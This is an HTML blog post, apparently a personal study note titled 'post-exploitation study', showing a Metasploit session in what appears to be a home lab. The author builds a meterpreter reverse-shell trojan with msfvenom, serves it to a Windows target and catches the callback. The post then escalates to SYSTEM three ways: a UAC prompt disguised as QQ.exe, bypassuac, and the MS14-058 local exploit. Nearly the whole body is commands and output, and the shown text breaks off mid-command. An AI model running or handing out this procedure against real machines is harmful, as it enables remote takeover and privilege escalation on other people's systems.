@@ -1,0 +1,405 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta property="og:type" content="article">
+<meta property="og:title" content="后渗透学习">
+<meta property="og:url" content="http://example.com/2021/08/03/%E5%90%8E%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/%E5%90%8E%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.loli.net/2021/08/04/ds1AlSGtZEc5zWy.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/04/tsWhKF9BMNf8Llm.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/04/K6UCcaFmhv4QIgq.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/04/wUT7YfX9byMtjux.png">
+<meta property="article:published_time" content="2021-08-03T12:16:41.000Z">
+<meta property="article:modified_time" content="2021-08-04T08:36:03.148Z">
+<meta property="article:author" content="nan-del">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/08/04/ds1AlSGtZEc5zWy.png">
+
+<link rel="canonical" href="http://example.com/2021/08/03/%E5%90%8E%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/%E5%90%8E%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>后渗透学习 | Hexo</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Hexo</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/08/03/%E5%90%8E%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/%E5%90%8E%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="nan-del">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          后渗透学习
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2021-08-03 20:16:41" itemprop="dateCreated datePublished" datetime="2021-08-03T20:16:41+08:00">2021-08-03</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-08-04 16:36:03" itemprop="dateModified" datetime="2021-08-04T16:36:03+08:00">2021-08-04</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p><escape><span id="more"></span></escape></p>
+<h2 id="提权复现"><a href="#提权复现" class="headerlink" title="提权复现"></a>提权复现</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 1. 打开msf</span> </span><br><span class="line">┌──(root💀kali)-[~/桌面]</span><br><span class="line">└─# msfconsole </span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 2. 制作木马</span></span><br><span class="line">┌──(root💀kali)-[~/桌面]</span><br><span class="line">└─# msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=10.200.131.128 LPORT=4444 -i 3 -f exe -o msf.exe</span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: 510 bytes</span><br><span class="line">Final size of exe file: 7168 bytes</span><br><span class="line">Saved as: msf.exe</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 3. 把木马发送到目标主机上，开启</span></span><br><span class="line">┌──(root💀kali)-[~/桌面]</span><br><span class="line">└─# python -m SimpleHTTPServer 800</span><br><span class="line">Serving HTTP on 0.0.0.0 port 800 ...</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 4. 开始监听</span></span><br><span class="line">msf6 &gt; use exploit/multi/handler </span><br><span class="line">[*] Using configured payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; </span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 5. 然后再设置LHOST和LPORT就可以exploit执行了，在执行目标上的msf.exe，就可以获得session了</span></span><br><span class="line">msf6 exploit(multi/handler) &gt; set lhost 10.200.131.128</span><br><span class="line">lhost =&gt; 10.200.131.128</span><br><span class="line">msf6 exploit(multi/handler) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/handler):</span><br><span class="line"></span><br><span class="line">   Name  Current Setting  Required  Description</span><br><span class="line">   ----  ---------------  --------  -----------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  process          yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST     10.200.131.128   yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Wildcard Target</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(multi/handler) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.200.131.128:4444 </span><br><span class="line">[*] Sending stage (175174 bytes) to 10.200.131.26</span><br><span class="line">[*] Meterpreter session 1 opened (10.200.131.128:4444 -&gt; 10.200.131.26:49178) at 2021-08-04 15:13:24 +0800</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 这里就已经获得了session了</span></span><br><span class="line">meterpreter &gt; getuid  # 这里输入命令查看权限，这里是普通权限，所以下一步要提权</span><br><span class="line">Server username: nan-PC\nan</span><br><span class="line">meterpreter &gt; getsystem  # getsystem来提权，但是可以看到，这条命令没有执行成功</span><br><span class="line">[-] 2001: Operation failed: This function is not supported on this system. The following was attempted:</span><br><span class="line">[-] Named Pipe Impersonation (In Memory/Admin)</span><br><span class="line">[-] Named Pipe Impersonation (Dropper/Admin)</span><br><span class="line">[-] Token Duplication (In Memory/Admin)</span><br><span class="line">[-] Named Pipe Impersonation (RPCSS variant)</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 1.使用提高程序的运行级别来实现提权操作</span></span><br><span class="line">meterpreter &gt; background </span><br><span class="line">[*] Backgrounding session 1...</span><br><span class="line">msf6 exploit(multi/handler) &gt; use exploit/windows/local/ask</span><br><span class="line">[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(windows/local/ask) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/local/ask):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   FILENAME                    no        File name on disk</span><br><span class="line">   PATH                        no        Location on disk, %TEMP% used if not set</span><br><span class="line">   SESSION                     yes       The session to run this module on.</span><br><span class="line">   TECHNIQUE  EXE              yes       Technique to use (Accepted: PSH, EXE)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  process          yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST     10.200.131.128   yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Windows</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/local/ask) &gt; set session 1   # 这里要设置session</span><br><span class="line">session =&gt; 1</span><br><span class="line">msf6 exploit(windows/local/ask) &gt; set filename QQ.exe  # 这里设置想要使用的软件名称，最好使用一般常用的软件</span><br><span class="line">filename =&gt; QQ.exe</span><br><span class="line">msf6 exploit(windows/local/ask) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.200.131.128:4444 </span><br><span class="line">[*] UAC is Enabled, checking level...</span><br><span class="line">[*] The user will be prompted, wait for them to click &#x27;Ok&#x27;</span><br><span class="line">[*] Uploading QQ.exe - 73802 bytes to the filesystem...</span><br><span class="line">[*] Executing Command!</span><br><span class="line">[*] Sending stage (175174 bytes) to 10.200.131.26</span><br><span class="line">[*] Meterpreter session 2 opened (10.200.131.128:4444 -&gt; 10.200.131.26:49182) at 2021-08-04 15:19:11 +0800</span><br><span class="line"><span class="meta">#</span><span class="bash"> 这里就直接成功的获得了另一个session</span></span><br><span class="line">meterpreter &gt; </span><br><span class="line">meterpreter &gt; getuid  # 再次查看权限，还是普通权限</span><br><span class="line">Server username: nan-PC\nan</span><br><span class="line">meterpreter &gt; getsystem  # 再次提权，结果这一次成功提权，获得system权限</span><br><span class="line">...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 这里你可以看到两个session，一个是之前的没有提权的，一个是提权之后的</span></span><br><span class="line">msf6 exploit(windows/local/ask) &gt; sessions</span><br><span class="line"></span><br><span class="line">Active sessions</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">  Id  Name  Type                     Information                   Connection</span><br><span class="line">  --  ----  ----                     -----------                   ----------</span><br><span class="line">  1         meterpreter x86/windows  nan-PC\nan @ NAN-PC           10.200.131.128:4444 -&gt; 10.200.131.26:49178 (10.200.131.26)</span><br><span class="line">  2         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ NAN-PC  10.200.131.128:4444 -&gt; 10.200.131.26:49182 (10.200.131.26)</span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/local/ask) &gt; </span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 2.使用UAC绕过方式提权</span></span><br><span class="line">msf6 &gt; use exploit/windows/local/bypassuac </span><br><span class="line">[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(windows/local/bypassuac) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/local/bypassuac):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   SESSION                     yes       The session to run this module on.</span><br><span class="line">   TECHNIQUE  EXE              yes       Technique to use if UAC is turned off (Accepted: PSH, EXE)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  process          yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST     10.200.131.128   yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Windows x86</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/local/bypassuac) &gt; sessions  # 因为这里也要设置session，所以看一下第一个session过期了没</span><br><span class="line"></span><br><span class="line">Active sessions</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">  Id  Name  Type                     Information                   Connection</span><br><span class="line">  --  ----  ----                     -----------                   ----------</span><br><span class="line">  1         meterpreter x86/windows  nan-PC\nan @ NAN-PC           10.200.131.128:4444 -&gt; 10.200.131.26:49178 (10.200.131.26)</span><br><span class="line">  2         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ NAN-PC  10.200.131.128:4444 -&gt; 10.200.131.26:49182 (10.200.131.26)</span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/local/bypassuac) &gt; set session 1  # 设置session,这里只用设置session,然后既可以直接执行了</span><br><span class="line">session =&gt; 1</span><br><span class="line">msf6 exploit(windows/local/bypassuac) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/local/bypassuac):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   SESSION    1                yes       The session to run this module on.</span><br><span class="line">   TECHNIQUE  EXE              yes       Technique to use if UAC is turned off (Accepted: PSH, EXE)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  process          yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST     10.200.131.128   yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Windows x86</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/local/bypassuac) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.200.131.128:4444 </span><br><span class="line">[*] UAC is Enabled, checking level...</span><br><span class="line">[+] UAC is set to Default</span><br><span class="line">[+] BypassUAC can bypass this setting, continuing...</span><br><span class="line">[+] Part of Administrators group! Continuing...</span><br><span class="line">[*] Uploaded the agent to the filesystem....</span><br><span class="line">[*] Uploading the bypass UAC executable to the filesystem...</span><br><span class="line">[*] Meterpreter stager executable 73802 bytes long being uploaded..</span><br><span class="line">[*] Sending stage (175174 bytes) to 10.200.131.26</span><br><span class="line">[*] Meterpreter session 3 opened (10.200.131.128:4444 -&gt; 10.200.131.26:49188) at 2021-08-04 15:25:54 +0800</span><br><span class="line"><span class="meta">#</span><span class="bash"> 这里也是成功的获得一个session</span></span><br><span class="line">meterpreter &gt; getuid  # 查看权限，结果也是普通权限</span><br><span class="line">Server username: nan-PC\nan</span><br><span class="line">meterpreter &gt; getsystem  # 这里再提权看看，结果提权成功</span><br><span class="line">...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br><span class="line">meterpreter &gt; </span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 3.利用本地提权漏洞进行提权</span></span><br><span class="line">msf6 &gt; use exploit/windows/local/ms14_058_track_popup_menu </span><br><span class="line">[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(windows/local/ms14_058_track_popup_menu) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/local/ms14_058_track_popup_menu):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   SESSION                   yes       The session to run this module on.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  thread           yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST     10.200.131.128   yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Windows x86</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/local/ms14_058_track_popup_menu) &gt; set session 1  # 这里还是要设置session</span><br><span class="line">session =&gt; 1</span><br><span class="line">msf6 exploit(windows/local/ms14_058_track_popup_menu) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/local/ms14_058_track_popup_menu):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   SESSION  1                yes       The session to run this module on.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  thread           yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST     10.200.131.128   yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Windows x86</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/local/ms14_058_track_popup_menu) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.200.131.128:4444 </span><br><span class="line">[*] Launching notepad to host the exploit...</span><br><span class="line">[+] Process 1748 launched.</span><br><span class="line">[*] Reflectively injecting the exploit DLL into 1748...</span><br><span class="line">[*] Injecting exploit into 1748...</span><br><span class="line">[*] Exploit injected. Injecting payload into 1748...</span><br><span class="line">[*] Payload injected. Executing exploit...</span><br><span class="line">[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.</span><br><span class="line">[*] Sending stage (175174 bytes) to 10.200.131.26</span><br><span class="line">[*] Meterpreter session 4 opened (10.200.131.128:4444 -&gt; 10.200.131.26:49190) at 2021-08-04 15:30:16 +0800</span><br><span class="line"><span class="meta">#</span><span class="bash"> 这里又获得一个session</span></span><br><span class="line">meterpreter &gt; getuid  # 查看权限，发现这个直接就是system权限</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br><span class="line">meterpreter &gt; </span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 最后查看sessions</span></span><br><span class="line">msf6 exploit(windows/local/ms14_058_track_popup_menu) &gt; sessions</span><br><span 